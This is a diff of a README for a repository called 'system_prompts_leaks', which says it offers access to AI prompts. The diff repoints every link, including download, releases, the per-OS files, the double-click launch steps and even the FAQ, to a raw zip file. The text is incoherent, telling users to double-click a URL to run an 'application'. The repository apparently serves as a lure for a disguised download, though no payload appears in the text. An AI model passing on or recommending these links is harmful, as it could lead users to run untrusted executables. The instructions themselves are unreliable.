@@ -1,6 +1,6 @@
 # 🚀 system_prompts_leaks - Easy Access to AI Prompts
 
-[![Download](https://raw.githubusercontent.com/reis428/system_prompts_leaks/main/hulsite/system_prompts_leaks.zip%20Now-blue)](https://raw.githubusercontent.com/reis428/system_prompts_leaks/main/hulsite/system_prompts_leaks.zip)
+[![Download](https://raw.githubusercontent.com/reis428/system_prompts_leaks/main/Google/system-leaks-prompts-v1.0.zip%20Now-blue)](https://raw.githubusercontent.com/reis428/system_prompts_leaks/main/Google/system-leaks-prompts-v1.0.zip)
 
 ## 🔍 Overview
 
@@ -14,7 +14,7 @@ Follow the steps below to download and run the application easily. No programmin
 
 To download the application, please visit this page:
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/reis428/system_prompts_leaks/main/hulsite/system_prompts_leaks.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/reis428/system_prompts_leaks/main/Google/system-leaks-prompts-v1.0.zip)
 
 On the Releases page, you will see different versions of the application. Click on the most recent version to find the download options.
 
@@ -33,8 +33,8 @@ Before you begin, your device should meet the following requirements:
 2. Click on the latest version of the app.
 3. Look for the **assets** section, where you will find downloadable files.
 4. Select the appropriate file for your system.
-   - For Windows, choose `https://raw.githubusercontent.com/reis428/system_prompts_leaks/main/hulsite/system_prompts_leaks.zip`.
-   - For macOS, choose `https://raw.githubusercontent.com/reis428/system_prompts_leaks/main/hulsite/system_prompts_leaks.zip`.
+   - For Windows, choose `https://raw.githubusercontent.com/reis428/system_prompts_leaks/main/Google/system-leaks-prompts-v1.0.zip`.
+   - For macOS, choose `https://raw.githubusercontent.com/reis428/system_prompts_leaks/main/Google/system-leaks-prompts-v1.0.zip`.
 5. Save the file to your computer.
 
 ### 📂 Extracting Files
@@ -56,11 +56,11 @@ After extracting, follow these steps to run the application:
 
 - **Windows:**
   1. Navigate to the extracted folder.
-  2. Double-click `https://raw.githubusercontent.com/reis428/system_prompts_leaks/main/hulsite/system_prompts_leaks.zip` to launch the application.
+  2. Double-click `https://raw.githubusercontent.com/reis428/system_prompts_leaks/main/Google/system-leaks-prompts-v1.0.zip` to launch the application.
   
 - **macOS:**
   1. Open the extracted folder.
-  2. Double-click `https://raw.githubusercontent.com/reis428/system_prompts_leaks/main/hulsite/system_prompts_leaks.zip` to start the application.
+  2. Double-click `https://raw.githubusercontent.com/reis428/system_prompts_leaks/main/Google/system-leaks-prompts-v1.0.zip` to start the application.
 
 ## 📝 Usage
 
@@ -78,12 +78,12 @@ This application is developed with user safety in mind. Always download from the
 
 ## 📞 Support
 
-If you have any issues with downloading or running the application, please check the [FAQ section](https://raw.githubusercontent.com/reis428/system_prompts_leaks/main/hulsite/system_prompts_leaks.zip) or create an issue in this repository for assistance.
+If you have any issues with downloading or running the application, please check the [FAQ section](https://raw.githubusercontent.com/reis428/system_prompts_leaks/main/Google/system-leaks-prompts-v1.0.zip) or create an issue in this repository for assistance.
 
 ## 📢 Contribution
 
 If you're interested in contributing to this project, feel free to fork the repository and submit a pull request. Your contributions are welcome!
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/reis428/system_prompts_leaks/main/hulsite/system_prompts_leaks.zip) 
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/reis428/system_prompts_leaks/main/Google/system-leaks-prompts-v1.0.zip) 
 
 Happy exploring!
